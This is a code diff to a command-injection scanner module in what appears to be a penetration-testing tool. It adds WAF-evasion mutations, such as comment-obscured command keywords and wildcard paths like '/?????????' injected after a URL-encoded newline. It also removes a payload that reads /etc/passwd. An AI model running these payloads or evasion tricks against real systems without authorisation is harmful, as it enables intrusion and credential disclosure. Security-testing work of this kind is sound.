@@ -7,7 +7,7 @@ import random
 
 NAME = "cmdinj"
 CATEGORY = "vuln"
-DESCRIPTION = "Advanced Command Injection Scanner (File Read Bypass + WAF Evasion)"
+DESCRIPTION = "Advanced Command Injection Scanner (Smart Filtering + WAF Bypass)"
 
 # =================================================
 # Payload Engine
@@ -49,12 +49,17 @@ def mutate_case_randomizer(p):
             chars.append(c)
     return "".join(chars)
 
+def mutate_comment_injection(p):
+    keywords = ["id", "whoami", "sleep", "ping", "ls", "cat"]
+    mutated = p
+    for kw in keywords:
+        if kw in p:
+            obscured = "/*/".join(list(kw))
+            mutated = mutated.replace(kw, obscured)
+    return mutated
+
 def mutate_quote_wrapper(p):
     return f"'{p}'"
-
-# -------------------------------------------------
-# NEW: Wildcard Payloads (High Success Rate)
-# -------------------------------------------------
 
 def mutate_wildcard_newline_ip(p):
     mapping = {
@@ -62,33 +67,21 @@ def mutate_wildcard_newline_ip(p):
         "whoami": "/?????????",
         "sleep": "/???/?????"
     }
+
     for cmd, wildcard in mapping.items():
         if cmd in p:
             clean_payload = p.replace(";", "").replace("&&", "").replace("&", "").replace("|", "")
             mutated_payload = clean_payload.replace(cmd, wildcard)
             return f"127.0.0.1%0a{mutated_payload}"
-    return p
-
-def mutate_cat_passwd(p):
-    """
-    Generates a payload to read /etc/passwd using wildcards.
-    cat /etc/passwd -> /???/c?t%09/etc/passwd
-    Matches keyword 'cat' with /???/c?t
-    Matches space with %09 (tab)
-    Target: 'root:' in regex
-    """
-    if "cat" in p:
-        # Replace 'cat' with /???/c?t (matches /bin/cat, /usr/bin/cat)
-        # Replace ' ' with %09 (Tab)
-        return "127.0.0.1%0a/???/c?t%09/etc/passwd"
+            
     return p
 
 MUTATIONS = [
     mutate_space_to_tab,
     mutate_space_to_newline,
     mutate_case_randomizer,
-    mutate_wildcard_newline_ip,  # ID/Whoami wildcard
-    mutate_cat_passwd,           # Cat passwd wildcard
+    mutate_comment_injection,
+    mutate_wildcard_newline_ip,
     mutate_quote_wrapper
 ]
 
@@ -104,10 +97,14 @@ class CmdInjectionEngine:
         self.emit = emit
         self.options = options or {}
         self.session = requests.Session()
-        self.session.headers.update({"User-Agent": "Hellhound-CMDi/10.0"})
+        self.session.headers.update({"User-Agent": "Hellhound-CMDi/9.0"})
         self.vulnerabilities = []
         self.time_threshold = 5
         self.waf_detected = False
+        
+        # Track scanned parameters to prevent repetition
+        # Structure: {(clean_url, param_name, method)}
+        self.scanned_params = set()
 
     # -------------------------------------------------
     # WAF Detection
@@ -177,24 +174,20 @@ class CmdInjectionEngine:
         return mutated
 
     # -------------------------------------------------
-    # Detection Logic (ROBUST REGEX)
+    # Detection Logic
     # -------------------------------------------------
 
     def analyze_output(self, text):
         patterns = [
-            # Linux/Unix
-            r"uid=\d+\([^)]+\)",     # uid=1000(user)
-            r"uid=\d+",               # uid=1000 (if groups omitted)
-            r"gid=\d+\([^)]+\)",     # gid=1000(group)
-            r"groups=\d+\([^)]+\)",  # groups=...
-            r"root:",                 # root user (from /etc/passwd)
-            r"www-data",              # apache user
-            r"nobody:",               # nobody user
-            
-            # Windows
-            r"administrator",        # Windows Administrator account name
-            r"S-1-5-21",              # Windows Security Identifier (SID)
-            r"\\[a-z0-9_-]+$",       # COMPUTERNAME\username pattern
+            r"uid=\d+\([^)]+\)",
+            r"uid=\d+",
+            r"gid=\d+\([^)]+\)",
+            r"groups=\d+\([^)]+\)",
+            r"root:",
+            r"www-data",
+            r"administrator",
+            r"S-1-5-21",
+            r"\\[a-z0-9_-]+$",
         ]
 
         for line in text.split("\n"):
@@ -211,13 +204,28 @@ class CmdInjectionEngine:
 
     def inject_get_param(self, url, param_name):
 
+        # ---------------------------------------------------------
+        # FIX: Check if this specific parameter has already been scanned
+        # ---------------------------------------------------------
         parsed = urllib.parse.urlparse(url)
+        clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        scan_id = (clean_url, param_name, "GET")
+
+        if scan_id in self.scanned_params:
+            return
+        
+        self.scanned_params.add(scan_id)
+        # ---------------------------------------------------------
+
         query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
 
         baseline = self.get_average_baseline(url, "GET")
         
         payloads = self.generate_payloads()
         total = len(payloads)
+        
+        # Optional: Uncomment to see which parameter is currently being scanned
+        # self.emit.info(f"Scanning GET param '{param_name}'...")
 
         for idx, (payload, os_type, mode) in enumerate(payloads, 1):
 
@@ -253,17 +261,29 @@ class CmdInjectionEngine:
 
     def inject_post_param(self, url, param_name):
 
+        # ---------------------------------------------------------
+        # FIX: Check if this specific parameter has already been scanned
+        # ---------------------------------------------------------
+        parsed = urllib.parse.urlparse(url)
+        clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        scan_id = (clean_url, param_name, "POST")
+
+        if scan_id in self.scanned_params:
+            return
+
+        self.scanned_params.add(scan_id)
+        # ---------------------------------------------------------
+
         baseline = self.get_average_baseline(url, "POST")
         
         payloads = self.generate_payloads()
         total = len(payloads)
-        self.emit.info(f"Scanning POST param '{param_name}' with {total} payloads...")
+        
+        # Optional: Uncomment to see which parameter is currently being scanned
+        # self.emit.info(f"Scanning POST param '{param_name}'...")
 
         for idx, (payload, os_type, mode) in enumerate(payloads, 1):
             
-            if idx % 5 == 0 or idx == 1 or idx == total:
-                self.emit.info(f"Testing payload {idx}/{total}: {payload[:40]}...")
-
             data = {param_name: payload}
 
             try:
@@ -335,21 +355,27 @@ class CmdInjectionEngine:
             if not params:
                 continue
 
-            # Filter out non-input fields
+            # ---------------------------------------------------------
+            #  FILTER OUT NON-INJECTION PARAMETERS (Checkboxes, Buttons)
+            # ---------------------------------------------------------
             target_params = []
             for p in params:
                 name = p.get("name")
                 p_type = p.get("type", "text").lower()
                 
+                # Skip checkboxes, submit buttons, hidden fields, radio buttons
                 if p_type in ["checkbox", "submit", "button", "radio", "hidden"]:
-                    self.emit.info(f"Skipping non-input field: '{name}' ({p_type})")
+                    # Silent skip (removed logging)
                     continue
+                
+                # Skip control parameters that don't accept user data
                 if name in ["enable_waf", "submit", "login", "remember_me"]:
-                    self.emit.info(f"Skipping control parameter: '{name}'")
+                    # Silent skip (removed logging)
                     continue
 
                 target_params.append(p)
             
+            # Overwrite params with the filtered list
             params = target_params
 
             if not params:
@@ -404,6 +430,7 @@ class CmdInjectionEngine:
 
     def run(self):
 
+        # Check for WAF before scanning
         self.check_waf(self.target)
         
         if self.waf_detected:
@@ -412,10 +439,10 @@ class CmdInjectionEngine:
         spider_data = self.options.get("spider_results")
 
         if spider_data:
-            self.emit.info("Auto mode enabled (Spider integration)")
+            self.emit.info("Auto mode: Spider data detected")
             self.auto_from_spider(spider_data)
         else:
-            self.emit.info("Running manual parameter analysis")
+            self.emit.info("Manual mode: No spider data available")
             self.manual_scan()
 
         summary = {
